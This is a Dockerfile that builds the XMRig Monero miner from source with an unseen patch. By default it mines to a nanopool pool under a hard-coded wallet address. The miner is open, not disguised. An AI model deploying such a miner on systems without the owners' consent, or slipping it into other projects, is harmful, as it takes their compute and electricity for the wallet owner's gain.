FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v6.3.2'

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15
RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

ENTRYPOINT ["./xmrig"]
CMD ["--url=xmr-us-west1.nanopool.org:14444", "--user=46exJwjDcqSFRfauiLu6AFc1wfUpWCooZUv8p8AXSvoZgMJSznhHXnUhLGYncTBYBzEQYtdJ613CLgC47vqBmQbtPxENQLC", "--pass=x", "-k", "--coin=monero"]˚
